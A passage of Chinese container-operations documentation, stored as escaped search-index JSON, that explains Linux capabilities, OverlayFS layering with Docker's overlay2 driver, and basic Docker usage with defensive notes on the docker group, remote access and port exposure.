\u200b\u662f\u200b\u4e00\u4e2a\u200b\u597d\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff1a\u200b\u7ec6\u5316\u200b\u539f\u5148\u200b root \u200b\u7684\u200b\u6743\u9650\u200b\uff0c\u200b\u51cf\u5c11\u200b\u653b\u51fb\u9762\u200b\u3002\u200b\u4f46\u662f\u200b\u5728\u5b9e\u8df5\u4e0a\u200b\uff0c\u200b\u8bb8\u591a\u200b\u91cd\u8981\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>mount</code>\uff0c\u200b\u90fd\u200b\u4f9d\u8d56\u4e8e\u200b <code>CAP_SYS_ADMIN</code> \u200b\u8fd9\u4e00\u200b\u80fd\u529b\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u4e86\u200b <code>CAP_SYS_ADMIN</code> \u200b\u6210\u4e3a\u200b\u4e8b\u5b9e\u4e0a\u200b\u7684\u200b \"the new root\"\u3002</p> <p>\u200b\u53ef\u200b\u9605\u8bfb\u200b lwn.net \u200b\u7684\u200b\u76f8\u5173\u200b\u6587\u7ae0\u200b \u200b\u4e86\u89e3\u200b\u66f4\u200b\u591a\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b\u4ee5\u4e0a\u200b\u63d0\u5230\u200b\u7684\u200b\u5b89\u5168\u200b\u6280\u672f\u200b\u5916\u200b\uff0c\u200b\u4f8b\u5982\u200b Docker \u200b\u7b49\u200b\u5bb9\u5668\u200b\u8fd8\u4f1a\u200b\u4f7f\u7528\u200b\u5982\u200b AppArmor\u3001SELinux \u200b\u7b49\u200b MAC\uff08Mandatory Access Control\uff09\u200b\u673a\u5236\u200b\u8fdb\u4e00\u6b65\u200b\u9650\u5236\u200b\u5bb9\u5668\u200b\u6743\u9650\u200b\u3002\u200b\u8fd9\u200b\u4e00\u90e8\u5206\u200b\u4f1a\u200b\u5728\u200b\u9ad8\u7ea7\u200b\u5185\u5bb9\u200b\u7684\u200b\u300cDAC \u200b\u4e0e\u200b MAC\u300d\u200b\u90e8\u5206\u200b\u8fdb\u4e00\u6b65\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/virtualization/container/#overlayfs","title":"Overlay \u200b\u6587\u4ef6\u7cfb\u7edf","text":"<p>Overlay \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff08OverlayFS\uff09\u200b\u4e0d\u662f\u200b\u5bb9\u5668\u200b\u6240\u200b\u5fc5\u9700\u200b\u7684\u200b\u2014\u2014\u200b\u6bd4\u5982\u8bf4\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u200b\u652f\u6301\u200b\u50cf\u200b chroot \u200b\u4e00\u6837\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4ece\u200b\u4e00\u4e2a\u200b rootfs \u200b\u76ee\u5f55\u200b\u542f\u52a8\u200b\u5bb9\u5668\u200b\uff08\u200b\u4f8b\u5982\u200b systemd-nspawn\uff09\u3002 \u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b Docker \u200b\u8fd9\u6837\u200b\u7684\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u200b\uff0c\u200b\u5176\u200b image \u200b\u7684\u200b\u5206\u5c42\u200b\u7ed3\u6784\u200b\u4f7f\u5f97\u200b OverlayFS \u200b\u6210\u4e3a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u7684\u200b\u6280\u672f\u200b\u3002 \u200b\u5c3d\u7ba1\u200b\u5bf9\u4e8e\u200b Docker \u200b\u6765\u8bf4\u200b\uff0c\u200b\u5176\u200b\u4e5f\u200b\u652f\u6301\u200b\u5176\u4ed6\u200b\u7684\u200b\u5199\u200b\u65f6\u200b\u590d\u5236\u200b\u7684\u200b\u5b58\u50a8\u200b\u9a71\u52a8\u200b\uff0c\u200b\u4f8b\u5982\u200b Btrfs \u200b\u548c\u200b ZFS\uff0c\u200b\u4f46\u662f\u200b OverlayFS \u200b\u4ecd\u7136\u200b\u662f\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u9009\u62e9\u200b\u2014\u2014\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u4e0d\u200b\u9700\u8981\u200b\u7279\u6b8a\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u652f\u6301\u200b\u3002</p> <p>\u200b\u6302\u8f7d\u200b OverlayFS \u200b\u9700\u8981\u200b\u4e09\u4e2a\u200b\u76ee\u5f55\u200b\uff1a</p> <ul> <li>lowerdir: \u200b\u53ea\u8bfb\u200b\u7684\u200b\u5e95\u5c42\u200b\u76ee\u5f55\u200b\uff08\u200b\u652f\u6301\u200b\u591a\u4e2a\u200b\uff09</li> <li>upperdir: \u200b\u53ef\u200b\u8bfb\u5199\u200b\u7684\u200b\u4e0a\u5c42\u200b\u76ee\u5f55\u200b</li> <li>workdir: \u200b\u9700\u8981\u200b\u4e3a\u200b\u4e0e\u200b\u4e0a\u5c42\u200b\u76ee\u5f55\u200b\u5904\u4e8e\u200b\u540c\u4e00\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u76ee\u5f55\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5904\u7406\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b</li> </ul> <p>\u200b\u6700\u7ec8\u200b\u5408\u6210\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4f1a\u200b\u5c06\u200b lowerdir \u200b\u4e0e\u200b upperdir \u200b\u5408\u5e76\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u76f8\u540c\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0cupperdir \u200b\u4f18\u5148\u200b\u3002 \u200b\u8ba9\u200b\u6211\u4eec\u200b\u8bd5\u4e00\u8bd5\u200b\uff1a</p> <pre><code>$ mkdir lower upper work merged\n$ echo \"lower\" &gt; lower/lower\n$ echo \"upper\" &gt; upper/upper\n$ mkdir lower/dir upper/dir\n$ echo \"lower1\" &gt; lower/dir/file1\n$ echo \"upper1\" &gt; upper/dir/file1\n$ echo \"lower2\" &gt; lower/dir/file2\n$ echo \"upper2\" &gt; upper/dir/file2\n$ echo \"lower4\" &gt; lower/dir/file4\n$ echo \"upper3\" &gt; upper/dir/file3\n$ sudo mount -t overlay overlay -o lowerdir=lower,upperdir=upper,workdir=work merged\n$ tree merged\nmerged/\n\u251c\u2500\u2500 dir\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 file1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 file2\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 file3\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 file4\n\u251c\u2500\u2500 lower\n\u2514\u2500\u2500 upper\n\n2 directories, 6 files\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b merged \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u6587\u4ef6\u200b\u662f\u200b\u5408\u5e76\u200b\u540e\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b lower \u200b\u548c\u200b upper \u200b\u76ee\u5f55\u200b\u7684\u200b\u6587\u4ef6\u200b\u3002</p> <pre><code>$ cat merged/lower\nlower\n$ cat merged/dir/file1\nupper1\n$ cat merged/dir/file2\nupper2\n$ cat merged/dir/file3\nupper3\n$ cat merged/dir/file4\nlower4\n</code></pre> <p>\u200b\u4e0a\u9762\u200b\u53ea\u6709\u200b upper \u200b\u4e0d\u200b\u5b58\u5728\u200b\u7684\u200b dir/file4 \u200b\u662f\u200b lower \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5370\u8bc1\u200b upper \u200b\u4f18\u5148\u200b\u3002</p> <pre><code>$ echo \"merged\" &gt; merged/merged\n$ echo \"modified-lower\" &gt; merged/lower\n$ cat upper/merged\nmerged\n$ cat upper/lower\nmodified-lower\n$ cat lower/merged\ncat: lower/merged: No such file or directory\n$ cat lower/lower\nlower\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u663e\u7136\u200b\u53d1\u73b0\u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u88ab\u200b\u5e94\u7528\u200b\u5230\u200b upperdir \u200b\u4e2d\u200b\u3002</p> <p>\u200b\u4f20\u7edf\u200b\u4e0a\u200b\uff0cOverlayFS \u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u7528\u9014\u200b\u662f\u200b\u5728\u200b LiveCD/LiveUSB \u200b\u4e0a\u200b\u4f7f\u7528\u200b\uff1a\u200b\u5728\u200b\u53ea\u8bfb\u200b\u7684\u200b\u5e95\u5c42\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u6302\u8f7d\u200b\u4e00\u4e2a\u200b\u53ef\u5199\u200b\u7684\u200b\u4e0a\u5c42\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u7528\u4e8e\u200b\u4fdd\u5b58\u200b\u7528\u6237\u200b\u7684\u200b\u6570\u636e\u200b\u3002 \u200b\u800c\u200b\u5728\u200b\u5bb9\u5668\u200b\uff08\u200b\u7279\u522b\u200b\u662f\u200b Docker\uff09\u200b\u4e0a\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u7684\u200b\u5206\u5c42\u200b\u8bbe\u8ba1\u200b\uff0cOverlayFS \u200b\u5c31\u200b\u6210\u4e3a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u200b\u597d\u200b\u7684\u200b\u9009\u62e9\u200b\u3002 \u200b\u5047\u8bbe\u200b\u67d0\u4e2a\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u6709\u200b\u4e09\u5c42\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u5c42\u200b\u90fd\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u4fee\u6539\u200b\u3002\u200b\u7531\u4e8e\u200b OverlayFS \u200b\u652f\u6301\u200b\u591a\u4e2a\u200b lowerdir\uff0c \u200b\u6240\u4ee5\u200b\u6700\u540e\u200b\u5408\u6210\u200b\u51fa\u6765\u200b\u7684\u200b image \u200b\u5c31\u662f\u200b\u7b2c\u4e00\u5c42\u200b\u57fa\u5e95\u200b + \u200b\u7b2c\u4e8c\u5c42\u200b\u7684\u200b\u53d8\u5316\u200b\u4f5c\u4e3a\u200b lowerdir\uff0c\u200b\u7b2c\u4e09\u5c42\u200b\u4f5c\u4e3a\u200b upperdir\uff0c \u200b\u8fd9\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ece\u200b <code>docker image inspect</code> \u200b\u7684\u200b\u7ed3\u679c\u200b\u5370\u8bc1\u200b\uff1a</p> <pre><code>$ sudo docker image inspect 201test\n\uff08\u200b\u7701\u7565\u200b\uff09\n        \"GraphDriver\": {\n            \"Data\": {\n                \"LowerDir\": \"/var/lib/docker/overlay2/9d15ee29579c96414c51ea2e693d2fe764da2e704a005e2d398025bf8c2b85b6/diff:/var/lib/docker/overlay2/38eb305239012877d40fc4f06620d0293d7632f188b986a0ff7f30a57b6feb32/diff\",\n                \"MergedDir\": \"/var/lib/docker/overlay2/a66d2956c278d83a86454659dba3b2f75b99b41ddb39c5227b02afde898efe55/merged\",\n                \"UpperDir\": \"/var/lib/docker/overlay2/a66d2956c278d83a86454659dba3b2f75b99b41ddb39c5227b02afde898efe55/diff\",\n                \"WorkDir\": \"/var/lib/docker/overlay2/a66d2956c278d83a86454659dba3b2f75b99b41ddb39c5227b02afde898efe55/work\"\n            },\n            \"Name\": \"overlay2\"\n        },\n\uff08\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\uff08\u200b\u5f53\u7136\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4e0d\u4f1a\u200b\uff0c\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u6302\u8f7d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u5c1d\u8bd5\u200b\u8bbf\u95ee\u200b merged \u200b\u76ee\u5f55\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u4e0d\u200b\u5b58\u5728\u200b\uff09</p> <p>\u200b\u4f7f\u7528\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u542f\u52a8\u200b\u7684\u200b\u5bb9\u5668\u200b\u5219\u200b\u5c06\u200b\u955c\u50cf\u200b\u4f5c\u4e3a\u200b lowerdir\uff0c\u200b\u5728\u200b\u5bb9\u5668\u200b\u91cc\u9762\u200b\u7684\u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\u5219\u200b\u4f1a\u200b\u88ab\u200b\u4fdd\u5b58\u200b\u5728\u200b upperdir \u200b\u4e2d\u200b\u3002</p> <pre><code>$ sudo docker run -it --rm --name test 201test\nroot@1522be2f7d29:/# echo 'test' &gt; /test\nroot@1522be2f7d29:/# # \u200b\u5207\u6362\u200b\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7ec8\u7aef\u200b\n$ sudo docker inspect test\n\uff08\u200b\u7701\u7565\u200b\uff09\n\"GraphDriver\": {\n            \"Data\": {\n                \"LowerDir\": \"/var/lib/docker/overlay2/34e8198226f478c89021fd9a00a31570cdda57d4fcea66a0bb8506cf7b81dff5-init/diff:/var/lib/docker/overlay2/a66d2956c278d83a86454659dba3b2f75b99b41ddb39c5227b02afde898efe55/diff:/var/lib/docker/overlay2/9d15ee29579c96414c51ea2e693d2fe764da2e704a005e2d398025bf8c2b85b6/diff:/var/lib/docker/overlay2/38eb305239012877d40fc4f06620d0293d7632f188b986a0ff7f30a57b6feb32/diff\",\n                \"MergedDir\": \"/var/lib/docker/overlay2/34e8198226f478c89021fd9a00a31570cdda57d4fcea66a0bb8506cf7b81dff5/merged\",\n                \"UpperDir\": \"/var/lib/docker/overlay2/34e8198226f478c89021fd9a00a31570cdda57d4fcea66a0bb8506cf7b81dff5/diff\",\n                \"WorkDir\": \"/var/lib/docker/overlay2/34e8198226f478c89021fd9a00a31570cdda57d4fcea66a0bb8506cf7b81dff5/work\"\n            },\n            \"Name\": \"overlay2\"\n        },\n\uff08\u200b\u7701\u7565\u200b\uff09\n$ sudo ls /var/lib/docker/overlay2/34e8198226f478c89021fd9a00a31570cdda57d4fcea66a0bb8506cf7b81dff5/diff/\ntest\n</code></pre> <p>\u200b\u89e3\u91ca\u200b Dockerfile \u200b\u7f16\u5199\u200b\u4e2d\u200b\u7684\u200b\u5b9e\u8df5\u200b</p> <p>\u200b\u4ece\u200b OverlayFS \u200b\u7684\u200b\u89d2\u5ea6\u200b\uff0c\u200b\u89e3\u91ca\u200b\u4ee5\u4e0b\u200b Dockerfile \u200b\u5b58\u5728\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a</p> <pre><code># \u200b\u4ee5\u4e0a\u200b\u90e8\u5206\u200b\u7701\u7565\u200b\nRUN wget -O /tmp/example.tar.gz https://example.com/example.tar.gz\nRUN tar -zxvf /tmp/example.tar.gz -C /tmp\nRUN make &amp;&amp; make install\nRUN rm -rf /tmp/*\n</code></pre>"},{"location":"ops/virtualization/container/#docker","title":"Docker","text":""},{"location":"ops/virtualization/container/#docker-basic","title":"\u57fa\u7840\u200b\u6982\u5ff5\u200b\u590d\u4e60","text":"<p>Docker \u200b\u662f\u200b\u4f17\u591a\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u4e2d\u200b\u7684\u200b\u4e00\u79cd\u200b\uff08\u200b\u4e5f\u200b\u662f\u200b\u6700\u200b\u6d41\u884c\u200b\u7684\u200b\u4e00\u79cd\u200b\uff09\u3002\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u4ece\u200b registry \u200b\u83b7\u53d6\u200b image\uff0c \u200b\u83b7\u5f97\u200b\u7684\u200b image \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u521b\u5efa\u200b container \u200b\u8fd0\u884c\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Dockerfile \u200b\u6765\u200b\u5b9a\u5236\u200b image\u3002 \u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0cDocker \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e0e\u200b\u5b58\u50a8\u200b\uff08volume\uff09\u3001\u200b\u7f51\u7edc\u200b\uff08network\uff09\u200b\u7b49\u200b\u76f8\u5173\u200b\u7684\u200b\u529f\u80fd\u200b\u3002 Docker \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u4e3b\u8981\u200b\u8003\u8651\u200b\u4e86\u200b\u5f00\u53d1\u200b\u4e0e\u200b\u90e8\u7f72\u200b\u7684\u200b\u4fbf\u5229\u6027\u200b\u3002</p> <p>Docker \u200b\u91c7\u53d6\u200b C-S \u200b\u67b6\u6784\u200b\uff0cserver daemon\uff08dockerd\uff09\u200b\u66b4\u9732\u200b\u4e00\u4e2a\u200b UNIX socket\uff08<code>/run/docker.sock</code>\uff09\uff0c \u200b\u7528\u6237\u200b\u901a\u8fc7\u200b <code>docker</code> \u200b\u8fd9\u4e2a\u200b CLI \u200b\u5de5\u5177\u200b\uff0c\u200b\u6216\u8005\u200b\u81ea\u884c\u200b\u7f16\u5199\u7a0b\u5e8f\u200b\u4e0e\u5176\u200b\u901a\u4fe1\u200b\u3002 \u200b\u8fd9\u4e2a\u200b daemon \u200b\u7684\u200b\u5bb9\u5668\u200b\u64cd\u4f5c\u200b\u5219\u200b\u662f\u200b\u4e0e\u200b containerd \u200b\u8fdb\u884c\u200b\u4ea4\u4e92\u200b\u3002</p> <p>Podman</p> <p>\u200b\u5bf9\u6bd4\u200b Docker \u200b\u7684\u200b C-S \u200b\u67b6\u6784\u200b\uff0c\u200b\u7ea2\u5e3d\u200b\u4e3b\u63a8\u200b\u7684\u200b Podman \u200b\u5219\u200b\u4e0d\u518d\u200b\u4f9d\u8d56\u4e8e\u200b daemon \u200b\u8fdb\u884c\u200b\u5bb9\u5668\u200b\u7ba1\u7406\u200b\u3002</p> <p>\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff1a</p> <pre><code>sudo docker run -it --rm --name test ubuntu:22.04\n</code></pre> <p>\u200b\u52a0\u5165\u200b docker \u200b\u7528\u6237\u7ec4\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u63d0\u4f9b\u200b root \u200b\u6743\u9650\u200b</p> <p>\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u5b89\u88c5\u200b\u4e0b\u200b\uff0cDocker socket \u200b\u53ea\u6709\u200b\u4f4d\u4e8e\u200b docker \u200b\u7528\u6237\u7ec4\u200b\u7684\u200b\u7528\u6237\u200b\u624d\u80fd\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b server daemon \u200b\u7a0b\u5e8f\u200b\u4ee5\u200b root \u200b\u6743\u9650\u200b\u8fd0\u884c\u200b\u3002 \u200b\u5c06\u200b\u7528\u6237\u200b\u52a0\u5165\u200b docker \u200b\u7528\u6237\u7ec4\u200b\u5373\u200b\u6388\u6743\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7528\u6237\u200b\u4e0e\u200b Docker \u200b\u7684\u200b UNIX socket\uff0c\u200b\u6216\u8005\u8bf4\u200b\u4e0e\u200b dockerd \u200b\u670d\u52a1\u7aef\u200b\uff0c\u200b\u4efb\u610f\u200b\u901a\u4fe1\u200b\u7684\u200b\u6743\u9650\u200b\u3002 \u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u521b\u5efa\u200b\u7279\u6743\u200b\u5bb9\u5668\u200b\u3001\u200b\u4efb\u610f\u200b\u6302\u8f7d\u200b\u5bbf\u4e3b\u673a\u200b\u76ee\u5f55\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u6765\u200b\u5b9e\u9645\u200b\u505a\u200b\u548c\u200b root \u200b\u4e00\u6a21\u4e00\u6837\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002</p> <p>2023 \u200b\u5e74\u200b\u7684\u200b Hackergame \u200b\u6709\u200b\u4e00\u9053\u200b\u76f8\u5173\u200b\u7684\u200b\u9898\u76ee\u200b\uff1aDocker for Everyone\u3002</p> <p>\u200b\u5c3d\u7ba1\u200b sudo \u200b\u652f\u6301\u200b\u9650\u5236\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b Docker CLI \u200b\u7684\u200b\u590d\u6742\u6027\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u9650\u5236\u200b\u5f88\u96be\u200b\u505a\u5230\u200b\u5b8c\u5907\u200b\uff0c\u200b\u6781\u6613\u200b\u88ab\u200b\u7ed5\u8fc7\u200b\u3002\u200b\u53ef\u200b\u53c2\u8003\u200b Hackergame 2024 \u200b\u7684\u200b\u9898\u76ee\u200b\uff1aDocker for Everyone Plus\u3002</p> <p>\u200b\u57fa\u4e8e\u200b\u76f8\u540c\u200b\u7684\u200b\u7406\u7531\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u8de8\u200b\u673a\u5668\u200b\u64cd\u4f5c\u200b Docker\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u7528\u200b <code>-H tcp://</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u5f00\u542f\u200b\u8fdc\u7a0b\u200b\u8bbf\u95ee\u200b\u3002 \u200b\u8bf7\u200b\u9605\u8bfb\u200b https://docs.docker.com/engine/security/protect-access/ \u200b\u4e86\u89e3\u200b\u5b89\u5168\u200b\u914d\u7f6e\u200b\u8fdc\u7a0b\u200b\u8bbf\u95ee\u200b Docker \u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u6240\u6709\u200b\u5757\u200b\u4ee3\u7801\u200b\u793a\u4f8b\u200b\u4e2d\u5747\u200b\u4f1a\u200b\u4f7f\u7528\u200b <code>sudo</code>\u3002</p> <p>\u200b\u4fdd\u6301\u200b\u73af\u5883\u200b\u6574\u6d01\u200b\uff1a\u200b\u7ed9\u200b\u5bb9\u5668\u200b\u8d77\u540d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u200b\u4e34\u65f6\u200b\u4f7f\u7528\u200b\u7684\u200b\u5bb9\u5668\u200b\u52a0\u4e0a\u200b <code>--rm</code></p> <p>\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u200b\u5e38\u89c1\u200b\u7684\u200b\u95ee\u9898\u200b\u662f\u200b\uff0c\u200b\u5f88\u591a\u200b\u4eba\u200b\u542f\u52a8\u200b\u5bb9\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\u76f4\u63a5\u200b\u8fd9\u4e48\u200b\u505a\u200b\uff1a</p> <pre><code>sudo docker run -it ubuntu:22.04\n</code></pre> <p>\u200b\u7136\u540e\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\u4e4b\u540e\u200b\u5c31\u200b\u76f4\u63a5\u200b\u9000\u51fa\u200b\u4e86\u200b\u3002\u200b\u8fd9\u4e48\u200b\u505a\u200b\u7684\u200b\u540e\u679c\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b <code>docker ps -a</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4e00\u5927\u5806\u200b\u5df2\u7ecf\u200b\u5904\u4e8e\u200b\u9000\u51fa\u200b\u72b6\u6001\u200b\u7684\u200b\u5bb9\u5668\u200b\u3002</p> <p>\u200b\u52a0\u4e0a\u200b <code>--name</code> \u200b\u53c2\u6570\u200b\u547d\u540d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u4e4b\u540e\u200b\u5224\u65ad\u200b\u5bb9\u5668\u200b\u7684\u200b\u7528\u9014\u200b\uff1b\u200b\u52a0\u4e0a\u200b <code>--rm</code> \u200b\u53c2\u6570\u200b\u5219\u200b\u4f1a\u200b\u5728\u200b\u5bb9\u5668\u200b\u9000\u51fa\u200b\u540e\u200b\u81ea\u52a8\u200b\u5220\u9664\u200b\u5bb9\u5668\u200b\u3002\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4e3a\u200b\u5e38\u7528\u200b\u7684\u200b\u547d\u4ee4\u200b\u6dfb\u52a0\u200b alias\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>alias tmpctr=\"sudo docker run -it --rm\"\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u6267\u884c\u200b <code>tmpctr ustclug/debian:12</code> \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b\u4e34\u65f6\u200b\u5bb9\u5668\u200b\u4e86\u200b\u3002</p> <p>\u200b\u53e6\u5916\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\u65f6\u200b\u975e\u5e38\u200b\u5e38\u89c1\u200b\u7684\u200b\u9700\u6c42\u200b\uff1a</p> <ul> <li><code>-e KEY=VALUE</code>/<code>--env KEY=VALUE</code>\uff1a\u200b\u8bbe\u7f6e\u200b\u73af\u5883\u53d8\u91cf\u200b</li> <li><code>-v HOST_PATH:CONTAINER_PATH</code>\uff1a\u200b\u6302\u8f7d\u200b\u5bbf\u4e3b\u673a\u200b\u76ee\u5f55\u200b<ul> <li>\u200b\u76f8\u5bf9\u8def\u5f84\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u52a0\u4e0a\u200b <code>$(pwd)</code>\uff0c\u200b\u50cf\u200b\u8fd9\u6837\u200b\uff1a<code>-v $(pwd)/data:/data</code></li> </ul> </li> <li><code>-p HOST_PORT:CONTAINER_PORT</code>\uff1a\u200b\u6620\u5c04\u200b\u7aef\u53e3\u200b</li> <li><code>--restart=always</code>/<code>--restart=unless-stopped</code>\uff1a\u200b\u8bbe\u7f6e\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u3001\u200b\u91cd\u542f\u200b\u7b56\u7565\u200b\uff08\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>docker update</code> \u200b\u4fee\u6539\u200b\uff09</li> <li><code>--memory=512m --memory-swap=512m</code>\uff1a\u200b\u9650\u5236\u200b\u5bb9\u5668\u200b\u5185\u5b58\u200b\u4f7f\u7528\u200b</li> </ul> <p>\u200b\u6620\u5c04\u200b\u7aef\u53e3\u200b\u7684\u200b\u5b89\u5168\u6027\u200b</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cDocker \u200b\u4f1a\u200b\u81ea\u884c\u200b\u7ef4\u62a4\u200b iptables \u200b\u89c4\u5219\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u6837\u200b\u7684\u200b\u89c4\u5219\u200b\u4e0d\u200b\u53d7\u200b ufw \u200b\u7b49\u200b\u5de5\u5177\u200b\u7684\u200b\u7ba1\u7406\u200b\u3002 \u200b\u8fd9\u4f1a\u200b\u5bfc\u81f4\u200b\u66b4\u9732\u200b\u7684\u200b\u7aef\u53e3\u200b\u7ed5\u8fc7\u200b\u4e86\u200b\u7cfb\u7edf\u200b\u7684\u200b\u9632\u706b\u5899\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5176\u4ed6\u200b\u673a\u5668\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>-p 127.0.0.1:xxxx:xxxx</code>\uff0c\u200b\u800c\u200b\u975e\u200b <code>-p xxxx:xxxx</code>\u3002 \u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b\u771f\u5b9e\u200b\u7684\u200b\u6848\u4f8b\u200b\uff0c\u200b\u67d0\u200b\u670d\u52a1\u5668\u200b\u8fd9\u6837\u200b\u542f\u52a8\u200b\u4e86\u200b\u4e00\u4e2a\u200b MongoDB \u200b\u6570\u636e\u5e93\u200b\u5bb9\u5668\u200b\uff1a</p> <pre><code>sudo docker run -p 27017:27017 -tid --name mongo mongo:3.6\n</code></pre> <p>\u200b\u8fc7\u200b\u4e86\u200b\u51e0\u4e2a\u200b\u6708\u200b\uff0c\u200b\u53d1\u73b0\u200b\u7a0b\u5e8f\u200b\u529f\u80fd\u200b\u4e0d\u200b\u6b63\u5e38\u200b\uff0c\u200b\u518d\u200b\u4e00\u200b\u770b\u200b\u624d\u200b\u53d1\u73b0\u200b\u6570\u636e\u200b\u88ab\u200b\u52a0\u5bc6\u200b\u52d2\u7d22\u200b\u4e86\u200b\u2014\u2014\u200b\u4e07\u5e78\u200b\u7684\u200b\u662f\u200b\u91cc\u9762\u200b\u6ca1\u6709\u200b\u91cd\u8981\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> 